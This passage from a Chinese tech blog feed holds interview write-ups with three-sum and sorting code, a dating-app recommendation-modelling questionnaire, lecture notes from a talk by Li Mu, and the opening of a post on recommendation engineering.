stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn1): BatchNorm2d(48, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (conv2): Conv2d(48, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn2): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">    )</span><br><span class="line">    (value_head): ValueHead(</span><br><span class="line">      (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (<span class="built_in">fc</span>): Linear(in_features=96, out_features=1, bias=True)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">  (second_net): RestNet8B96C(</span><br><span class="line">    (conv): Conv2d(1, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">    (bn): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">    (relu): ReLU()</span><br><span class="line">    (residues): Sequential(</span><br><span class="line">      (0): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (1): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (2): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (3): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (4): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (5): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (6): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (7): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (policy_head): PolicyHead(</span><br><span class="line">      (conv1): Conv2d(96, 48, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn1): BatchNorm2d(48, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (conv2): Conv2d(48, 1, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn2): BatchNorm2d(1, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">    )</span><br><span class="line">    (value_head): ValueHead(</span><br><span class="line">      (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">      (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (<span class="built_in">fc</span>): Linear(in_features=96, out_features=1, bias=True)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><hr><h1 id="4-手撕代码"><a href="#4-手撕代码" class="headerlink" title="4 手撕代码"></a>4 手撕代码</h1><p>一共问了两道题，都做出来了，而且做的很好，面试官给出题目我就有了思路，然后思路也是正确的。写代码也是一次写好后直接运行就正确，挺幸运的。</p><h2 id="4-1-三数之和"><a href="#4-1-三数之和" class="headerlink" title="4.1 三数之和"></a>4.1 三数之和</h2><p>题目就是力扣上的<a href="https://leetcode.cn/problems/3sum/" title="15. 三数之和">15. 三数之和</a>，之前自己做过这道题。主要区别是，力扣上的要求找出所有等于 $0$ 的三个数的组合，但是面试官说的是找出所有等于 $target$ 的三个数的组合，题目保证这个组合是唯一的。</p><p>直接开写，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下标从 1 开始</span></span><br><span class="line"><span class="type">int</span> nums[<span class="number">100</span>] = &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> target = <span class="number">6</span>, n = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">sort</span>(nums + <span class="number">1</span>, nums + <span class="number">1</span> + n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> tar = target - nums[k];</span><br><span class="line">        <span class="type">int</span> i = k + <span class="number">1</span>, j = n;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[i] + nums[j] != tar)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] &lt; tar) i ++;</span><br><span class="line">            <span class="keyword">else</span> j --;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i != j)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; nums[k] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; nums[i] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; nums[j];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组 $\text{nums}$ 的有效元素从下标 $1$ 开始，所以满足 $target&#x3D;6$ 的三个数应该是 0、1 和 5。写完了执行之前其实还担心不对，但是运行后答案正确还是挺激动的。</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image__qd8xEqsrI.png"></p><h2 id="4-2-数组排序"><a href="#4-2-数组排序" class="headerlink" title="4.2 数组排序"></a>4.2 数组排序</h2><p>由于算法岗使用的编程语言主要是 Python，但是我在做第一道题的时候用的 C++，所以面试官说你能用 Python 把上面的数组 $\text{nums}$ 排个序吗？使用什么排序方法都行。</p><p>其实我早就开始用 Python 写算法题了，所以对我来说不成问题，选了最保险的 $O(n^2)$ 的排序算法。</p><p>当时一开始想写冒泡排序，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: nums = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>]</span><br><span class="line">   ...: nums</span><br><span class="line">Out[<span class="number">3</span>]: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums) - <span class="number">1</span>):</span><br><span class="line">   ...:     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(nums)):</span><br><span class="line">   ...:         <span class="keyword">if</span> nums[i] &gt; nums[j]:</span><br><span class="line">   ...:             nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">   ...: nums</span><br><span class="line">Out[<span class="number">4</span>]: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure><p>结果是对的，但是后来一想，这好像不是冒泡排序，冒泡排序的流程如下：</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/4iifndesx2_BHrbK1VGch.gif"></p><p>每次交换相邻元素，但是我写的代码是每次交换 $\text{nums}[i]$ 和 $\text{nums}[j]$，所以我写的思路是：第一次把最小的移动第一个位置，第二次把第二小的移动到第二个位置，以此类推，能对就行。</p><p>冒泡排序的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums) - <span class="number">2</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> nums[j] &gt; nums[j + <span class="number">1</span>]:</span><br><span class="line">            nums[j], nums[j + <span class="number">1</span>] = nums[j + <span class="number">1</span>], nums[j]</span><br></pre></td></tr></table></figure><hr><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_nI4fmDlxNT.png"></p><p>这次面试还是学到了很多东西，上面整理的内容肯定都是常考的，而且有的时候不止考察你对推荐算法的理解，还有很多实际的问题。但是自己在做的时候完全没有想过。</p><p>不同的模型感觉现在自己的理解还是停留在表面，希望能够打开这个算法黑箱，这样我觉得才有机会自己开发出新的算法。</p><hr><h1 id="6-参考资料"><a href="#6-参考资料" class="headerlink" title="6 参考资料"></a>6 参考资料</h1><ol><li><a href="https://www.modb.pro/db/432322" title="「推荐系统特征工程」05. 特征构建">「推荐系统特征工程」05. 特征构建</a></li><li><a href="https://www.showmeai.tech/article-detail/195" title="图解机器学习 | LightGBM模型详解">图解机器学习 | LightGBM模型详解</a></li><li><a href="https://www.cnblogs.com/PythonLearner/p/13358415.html" title="九种缺失值处理方法">九种缺失值处理方法</a></li><li><a href="https://www.cnblogs.com/zhouyc/p/13545060.html" title="树模型们是如何处理缺失值的？">树模型们是如何处理缺失值的？</a></li><li><a href="https://zhuanlan.zhihu.com/p/491002495">阿里SIM-基于检索的用户行为兴趣CTR模型</a></li><li><a href="https://developer.nvidia.com/zh-cn/blog/rapids-cudf-accelerates-pandas-nearly-150x-with-zero-code-changes-2/" title="RAPIDS cuDF 可将 pandas 加速近 150 倍，且无需更改代码">RAPIDS cuDF 可将 pandas 加速近 150 倍，且无需更改代码</a></li><li><a href="https://www.runoob.com/w3cnote/bubble-sort.html" title="冒泡排序">冒泡排序</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录4：牵手未来技术一面</title>
      <link href="/2024/12/07/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%954%EF%BC%9A%E7%89%B5%E6%89%8B%E6%9C%AA%E6%9D%A5%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/"/>
      <url>/2024/12/07/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%954%EF%BC%9A%E7%89%B5%E6%89%8B%E6%9C%AA%E6%9D%A5%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1>1 面试背景</h1><ul><li>面试公司：牵手未来</li><li>面试岗位：算法实习生</li><li>面试类型：技术一面</li><li>面试时间：2024-12-05 16:00~17:00</li><li>面试结果：不通过 😊</li></ul><hr><h1>2 整体感受</h1><p>在面试之前，HR 说要做一个笔试题，我以为是机考，结果是下面这种：</p><p><img src="image_FPCiKm1Hav.png" alt=""></p><p>当时感觉这个公司还挺专业，提前让你做题。其他公司都没有，但是我后来又想，那这样不就可以很充分的去准备这些题吗？包括查资料等。那面试的时候问你的肯定你都提前准备了，还怎么拉齐面试时的背景知识？</p><p>我当时就给做完了，然后进行面试。面试官问我是哪个学院的，我说软微，他说他也是软微的。</p><p>面试的过程特别奇怪，一般会进行简历面，针对简历上的内容提问。但是面试官看到我弄过棋类博弈，直接开始想这个能不能用到他们的业务中？然后几乎全是围绕着他们公司的场景来交流的。</p><p>反正面试感受特别差，还问我简历上有哪些亮眼的地方（你是面试官还是我是面试官 😂）。</p><p>晚上的时候 HR 说没有通过，我当时很震惊，我感觉我没有什么致命的失误，当时很纳闷，因为如果表现不好的话我自己也会感觉出来。</p><p><img src="image_pQOlT_-gWw.png" alt=""></p><p>之后我上网查了一下，有一个回答：</p><p><img src="image_jPtZ5HHNS7.png" alt=""></p><p>当时突然好像明白了，好像知道为什么要做那个笔试题了，好像知道为什么面试简历一点不问了……只能说长见识了。</p><hr><h1>3 笔试题</h1><p>Hey，高兴认识优秀的你：</p><p>我们是牵手app的算法团队，致力打造陌生人社交算法领域顶级算法，曾经我们负责过探探每日十亿次以上的滑卡推荐，现在我们负责中国牵手、东南亚市占第一的omi、以及在美国、日韩等新创app推荐算法工作。</p><p>深耕多年的经验告诉我们，陌生人社交领域的算法的业务难度极高，也极具价值，与传统推荐算法领域的底层逻辑截然不同。为了找到更合适的夥伴，我们希望用几个看似简单却有深度的问题来提前让您思考，主要目的是提前理解业务，拉齐面试时的背景知识，同时期待高水平的同学能提出有洞见的结果。</p><p>面试前请提前下载“牵手app”，完成注册流程并滑卡体验，请告知注册手机号，并提前准备以下问题交给HR，面试官可能以场景题出发询问技术问题。</p><blockquote><p><strong>一、请解释在牵手app里面，一个男生和女生“配对”（意指产生对话窗，非交往），需要经过哪些环节？（请务必了解）</strong></p></blockquote><p>主要有以下途径：</p><ol><li>“推荐”页面寻找意向异性 → 送对方小红花</li><li>“喜欢”页面找到对我有意向的异性</li></ol><blockquote><p><strong>二、请解释“提升右滑喜欢率”、“提升配对率”、“提升配对后聊天率”，你认为哪个对于用户脱单最为重要？请为什么？</strong></p></blockquote><p>“提升配对后聊天率”对于用户脱单最为重要，原因如下：</p><ol><li>**实际互动：**尽管高的右滑喜欢率和配对率意味着更多的匹配机会，但如果匹配后没有有效的沟通，用户将无法建立真正的关系。</li><li>**用户体验：**若用户在匹配后能够顺利聊天，会增强他们对平台的满意度，从而增加他们继续使用该应用的意愿，同时也会增强信心。</li><li>**长期关系的可能性：**有效的沟通是建立信任和理解的基础，特别是脱单过程中沟通至关重要。</li></ol><blockquote><p><strong>三、就上题你认为最为重要的指标，提供一套建模思路，会选用什么特征？什么模型？如何定义样本？</strong></p></blockquote><p>首先，需要收集用户个人信息、历史匹配和聊天记录相关数据。并对收集到的数据进行清洗（处理缺失值、异常值等），之后进行特征工程和编码。</p><p>使用的特征可以包含以下几种：</p><ol><li>用户行为数据：用户行为在APP中可以分为显性反馈行为和隐性反馈行为。在牵手未来的场景中，显性反馈行为有：“推荐”页面的喜欢和不合适、主动“喜欢”一个异性、对异性送花、帖子点赞等。隐性反馈行为有：帖子进行评论、在一个异性主页停留的时间、点击哪个标签最多、和异性聊天的频率、登录时长、是否为活跃用户等。</li><li>用户关系数据：这一部分主要考虑对于用户A来说，喜欢B和C，同时用户D喜欢B的同时也喜欢C，那就说明用户B和用户C有很大的相似之处，所以可以对这部分信息进行挖掘。</li><li>属性、标签类数据：这一部分数据是直接描述用户的特征。可以通过 multi-hot 编码的方式将其转换成特征向量。</li><li>内容类数据：每个用户的主页以及发过的图文帖子都是描述用户的数据。对于文字，可以通过 BERT 等NLP模型进行处理，对于图片可以使用CNN模型进行处理提取内容特征。</li><li>上下文信息：可以统计用户通常在什么时间登录APP的时间信息以及地点信息，如果用户A通常在中午登录，而配对的用户B通常晚上登录，那么配对后聊天率就会降低。</li><li>统计类特征：可以统计每个用户的活跃程度以及受欢迎程度，如果一个用户A配对后聊天的次数很多，那么下次和用户B配对后，也有很多概率会聊天。以及统计配对的用户之间的相似度，相似度越高，则聊天概率越高。</li></ol><p>上述特征主要分为连续型特征和类别型特征。对于连续型特征，通常经过归一化、加非线性函数方式进行变换。类别型特征使用独热编码等方式转化为数值型，之后可以使用Word2Vec等方式对稀疏特征进行Embedding，捕捉不同属性之间的语义信息。</p><p>构建一个二分类模型，预测每一个配对后聊天的概率，比如 XGBoost、DIN模型等，然后对上述模型预测结果使用集成学习方法进行加权融合，得到最终的配对聊天率的预测值。</p><blockquote><p><strong>四、您主观认为图像占牵手整体所有信息的百分比是多少？例如70％</strong></p></blockquote><p>65%左右。</p><blockquote><p><strong>五、假想一种特殊的情况，假设牵手app除了图以外，其余信息完全没有，就第二题您觉得最重要的指标，您要如何依靠挖掘图像信息提升指标？请提供一套挖掘的的思路。</strong></p></blockquote><p>可以使用CV模型对图片进行目标检测，抽取图片特征，再把这些特征转换成标签类数据，供推荐系统使用。</p><p>同时也可以提取图片内容特征，把模型中间层的特征向量提取出来，作为用户图像的表示送入排序模型中。</p>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大佬演讲2：李沐讲座</title>
      <link href="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/"/>
      <url>/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-个人生涯"><a href="#1-个人生涯" class="headerlink" title="1 个人生涯"></a>1 个人生涯</h1><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image__H6ddzqwx8.png"></p><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_y1zPa-ars7.png"></p><p>你想解决什么问题，导致你会去做什么事情。</p><hr><h1 id="2-打工人"><a href="#2-打工人" class="headerlink" title="2 打工人"></a>2 打工人</h1><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_2Xly1emNL0.png"></p><p>公司也好，学校也好创造了一个比较简单的环境，待得越久，不是在一个更广的层次去思考一个问题。</p><hr><h1 id="3-PhD"><a href="#3-PhD" class="headerlink" title="3 PhD"></a>3 PhD</h1><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_TY0D8cPDfK.png"></p><p>博士还是看是否有研究价值，主要看个人追求，如果想要创造学术价值，并且真心热爱研究还是可以的，但是如果一心工作，读博士感觉很痛苦。</p><hr><h1 id="4-创业"><a href="#4-创业" class="headerlink" title="4 创业"></a>4 创业</h1><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_GUZ4kUcN0c.png"></p><p>所有的困难在你头上，逃避没有用，如果逃避它，就可能解决不了它。要热爱，才能真正做下去。</p><p>核心原因是有一个延迟享受，一个东西，可能5年之后才能得到正反馈。在没有立即正反馈的情况下，需要自己给自己加码，才能真正做下来这件事情。</p><hr><h1 id="5-动机"><a href="#5-动机" class="headerlink" title="5 动机"></a>5 动机</h1><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_jVu1Xp8Id3.png"></p><p>要有一个很强烈的动机，简单的欲望容易被满足，简单的恐惧容易被满足，一定要来自很深沉、很底层的欲望。</p><p>内心有什么特别不愿意分享出来的事情？</p><p>我感觉的话应该是有一些拖延的坏毛病，而且有的时候总是惯性思维，好像因为之前自己一直这么做，就下意识的去做一些事情。但是做一件事情之前，应该想一下是不是值得你去做这件事情。</p><p>想一下你背后的动机是什么？你是想要什么还是怕什么？直面自己的欲望，直面自己的恐惧。</p><p>需要把这种欲望和恐惧转换成向上的动机，动机一定是正确的，符合价值观的，逃避和放弃是满足不了你的欲望的，它仍然在那里，你也缓解不了你的恐惧。唯一去克服的办法就是去面对它。</p><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_yoIPoNB_RT.png"></p><p>你想要钱，那么就去赚钱。你想要名，那么就去出名。</p><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_wQ_Yohb9sB.png"></p><p>你如果对自己狠，克服了对自己狠，你就会成为一个非常牛逼的人。你如果对自己狠不下来，你就只能慢慢的上去。最后拼的是你对自己有多狠。</p><p>做选择比努力更重要。</p><hr><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h1><p><img src="/2024/12/06/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B22%EF%BC%9A%E6%9D%8E%E6%B2%90%E8%AE%B2%E5%BA%A7/image_iIgWRhjwb7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 大佬演讲 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习思考 </tag>
            
            <tag> 演讲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何成为一名优秀的推荐工程师</title>
      <link href="/2024/12/05/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E5%90%8D%E4%BC%98%E7%A7%80%E7%9A%84%E6%8E%A8%E8%8D%90%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
      <url>/2024/12/05/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E5%90%8D%E4%BC%98%E7%A7%80%E7%9A%84%E6%8E%A8%E8%8D%90%E5%B7%A5%E7%A8%8B%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<p>作为一名推荐工程师，所擅长的不应仅仅是机器学习相关知识，更应该从业务实践的角度出发，提升自己各方面的能力。</p><h1 id="1-推荐工程师的-4-项能力"><a href="#1-推荐工程师的-4-项能力" class="headerlink" title="1 推荐工程师的 4 项能力"></a>1 推荐工程师的 4 项能力</h1><p>抛开具体的岗位需求，从稍高的角度看待这个问题，一名推荐工程师的技术能力基本可以拆解成以下 4 个方面：<strong>知识、工具、逻辑、业务</strong>。</p><p>如果用技能雷达图的形式展示与机器学习相关的几个职位所需的能力，则大致如下图所示。</p><p><img src="/2024/12/05/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E5%90%8D%E4%BC%98%E7%A7%80%E7%9A%84%E6%8E%A8%E8%8D%90%E5%B7%A5%E7%A8%8B%E5%B8%88/image_6hhPGmv00k.png"></p><p>简单来说，任何推荐系统相关的工程师都应该满足 4 